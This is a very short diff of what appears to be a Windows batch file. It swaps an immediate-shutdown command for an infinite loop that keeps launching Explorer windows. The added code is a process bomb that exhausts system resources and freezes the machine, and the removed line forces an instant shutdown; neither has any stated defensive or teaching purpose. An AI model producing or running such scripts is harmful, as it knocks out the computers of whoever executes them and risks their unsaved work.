@@ -1,1 +1,4 @@
-shutdown /s /t 0
+@echo off
+:loop
+start explorer
+goto loop
